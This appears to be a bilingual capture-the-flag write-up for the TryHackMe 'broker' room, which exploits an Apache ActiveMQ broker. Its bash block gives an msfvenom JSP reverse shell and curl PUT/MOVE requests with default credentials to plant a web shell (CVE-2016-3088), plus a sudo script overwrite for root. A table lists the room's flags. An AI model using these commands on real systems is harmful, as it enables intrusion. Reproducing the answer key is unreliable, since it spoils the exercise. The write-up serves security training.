# broker
| **Dificultad** | Medium |
| **Tipo** | CTF |
| **Slug** | `broker` |
| **Link** | [TryHackMe](https://tryhackme.com/room/broker) |
| **Sección** | Linux / CTF |
| **Fuente** | Writeup de Kimusan (THM-writeups, GitHub) y CheckPoint Research |
| **Componentes** | Apache ActiveMQ 5.9.0, MQTT (1883), consola web Jetty/8161, mosquitto_sub, cliente MQTT shell (protocolo MQTT v3.1), CVE-2016-3088 (fileserver PUT/MOVE), msfvenom JSP reverse shell, sudo python3.7 subscribe.py, escalada a root |
| **Impacto** | Máquina Linux Medium: un broker ActiveMQ oculta un chat "secreto" en MQTT; la consola admin usa admin:admin por defecto y permite subir un shell JSP (CVE-2016-3088) para obtener una shell, y un script Python que se puede sobrescribir otorga root. |
---
**Contexto:** Paul y Max "cacharrean" con un software de mensajería (MQTT) para chatear en el trabajo creyendo que su jefe no puede espiarlos. La sala consiste en abusar de un broker Apache ActiveMQ expuesto: leer el chat con un cliente MQTT (forzando el protocolo a v3.1), explotar la consola web (put/move de un JSP) para conseguir shell, leer el user flag y escalar a root sobrescribiendo un script Python ejecutable con sudo NOPASSWD.
*EN: Paul and Max mess around with messaging software (MQTT) to chat at work, thinking their boss cannot eavesdrop. The room abuses an exposed Apache ActiveMQ broker: read the chat with an MQTT client (forcing protocol v3.1), exploit the web console (put/move a JSP) to get a shell, grab the user flag and escalate to root by overwriting a Python script runnable with sudo NOPASSWD.*
## Solucionario
### Task 1 — Deploy the Machine
**Explicación:** Desplegar la máquina. Pregunta de despliegue, sin respuesta.
*EN: Deploy the machine. Deployment question, no answer needed.*
### Task 2 — Enumerate and Exploit
**Explicación:** `nmap` revela SSH (22), MQTT (1883), la consola web (8161) y otros servicios. La consola web "Manage ActiveMQ broker" acepta `admin:admin` (default), lo que revela la versión y los topics del chat. El cliente estándar no conecta porque usa MQTT v3.1.1; con `python3 mqtt_client_shell.py`, `protocol 3` y `subscribe #` se leen los mensajes. Para la shell se sube `shell.jsp` (msfvenom JSP reverse) vía `PUT /fileserver/shell.jsp`, se localiza la ruta interna con un `PUT` provocando error, y se mueve a `/opt/apache-activemq-5.9.0/webapps/admin/shell.jsp` con `MOVE` (CVE-2016-3088). El user flag está en `flag.txt` y el root flag en `/root/root.txt` tras sobrescribir `subscribe.py` (sudo NOPASSWD).
*EN: `nmap` reveals SSH (22), MQTT (1883) and the web console (8161) among other services. The "Manage ActiveMQ broker" console accepts `admin:admin` (default), disclosing the version and chat topics. The standard client fails because it uses MQTT v3.1.1; with `python3 mqtt_client_shell.py`, `protocol 3` and `subscribe #` the messages are read. For the shell, `shell.jsp` (msfvenom JSP reverse) is uploaded via `PUT /fileserver/shell.jsp`, the internal path is leaked via a failing `PUT`, and the file is moved to `/opt/apache-activemq-5.9.0/webapps/admin/shell.jsp` with `MOVE` (CVE-2016-3088). The user flag is in `flag.txt` and the root flag in `/root/root.txt` after overwriting `subscribe.py` (sudo NOPASSWD).*

```bash
# Leer el chat (protocolo MQTT v3.1)
python3 mqtt_client_shell.py        # > protocol 3; > connect; > subscribe #
# Subir y mover el shell (CVE-2016-3088)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=1234 -f raw > shell.jsp
curl -u 'admin:admin' -X PUT --data "@shell.jsp" http://broker.thm:8161/fileserver/shell.jsp
curl -u 'admin:admin' -X PUT http://broker.thm:8161/fileserver/test/%20/%20
curl -u 'admin:admin' -X MOVE --header "Destination: file:///opt/apache-activemq-5.9.0/webapps/admin/shell.jsp" http://broker.thm:8161/fileserver/shell.jsp
# Escalada a root
echo 'import os; os.system("/bin/bash")' > /opt/apache-activemq-5.9.0/subscribe.py
sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```
### Task 3 — Practice
**Explicación:** Conclusión/practica de la sala: comprobar que se ha aprendido el proceso. Sin pregunta con respuesta.
*EN: Room conclusion/practice: verify what was learned. No answer required.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What are the ports between 1000 and 9000 that are open on the machine? | `1883,8161` |
| 2 | What is the name of the message broker software running on the webservice? | `ActiveMQ` |
| 3 | Which videogame are Paul and Max talking about? | `Hacknet` |
| 4 | What is the user flag? | `THM{you_got_a_m3ss4ge}` |
| 5 | What is the root flag? | `THM{br34k_br0k3_br0k3r}` |
---
**Metodología:** Recon (nmap full) → consola ActiveMQ con creds default admin:admin → inspección de la versión y topics → lectura del chat MQTT con cliente ajustado a protocolo v3.1 (mosquitto_sub falla) → identificación de CVE-2016-3088 (fileserver PUT + MOVE) → subida de JSP reverse shell → shell como activemq → user flag → `sudo -l` descubre `(root) NOPASSWD: /usr/bin/python3.7 subscribe.py` → sobrescritura del script → shell root → root flag.
**Learning chain:** network enumeration → default credentials → protocol version fiddling (MQTT v3.1) → ActiveMQ fileserver attack chain (PUT → MOVE → exec) → writable sudo-ed python script → privilege escalation.
**Lección:** *Las "ocultas" no lo están: los datos viajan en claro por un topic MQTT que cualquiera puede suscribir, y dos malas configuraciones seguidas (archivo servido por ActiveMQ + script editable con sudo) convierten un chat interno en root.*
**MITRE ATT&CK:** T1046 (Network Service Scanning), T1078 (Valid Accounts admin:admin), T1505.003 (Web Shell), T1059.007 (JavaScript/Java), T1572 (Protocol Tunneling), T1036, T1068, T1548.003 (Sudo).
**Fuente:** [TryHackMe - broker](https://tryhackme.com/room/broker)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.